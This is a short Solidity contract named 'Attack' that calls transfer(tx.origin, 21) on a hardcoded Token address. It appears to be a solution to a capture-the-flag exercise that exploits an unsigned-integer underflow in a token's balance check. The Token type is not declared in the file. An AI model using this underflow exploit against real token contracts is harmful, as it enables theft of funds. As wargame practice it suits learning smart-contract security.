// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {
    Token token = Token(0x52894329621ce07E0E3d68b61A086F9e2E57AF3C);
    function attack() external {
        token.transfer(tx.origin, 21);
    }
}